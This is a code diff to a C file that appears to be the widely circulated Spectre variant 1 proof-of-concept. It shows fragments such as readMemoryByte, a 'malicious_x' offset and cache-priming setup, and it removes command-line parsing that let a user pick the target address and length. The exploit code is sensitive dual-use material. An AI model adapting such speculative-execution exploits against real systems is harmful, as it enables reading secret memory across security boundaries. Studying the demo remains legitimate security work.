@@ -112,7 +112,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 	score[1] = results[k];
 }
 
-int spectre(int argc, const char* * argv)
+int spectre()
 {
 	printf("Putting '%s' in memory\n", secret);
 	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
@@ -121,12 +121,6 @@ int spectre(int argc, const char* * argv)
 
 	for (i = 0; i < sizeof(array2); i++)
 		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
-	if (argc == 3)
-	{
-		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
-		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
-		sscanf_s(argv[2], "%d", &len);
-	}
 
 	printf("Reading %d bytes:\n", len);
 	while (--len >= 0)
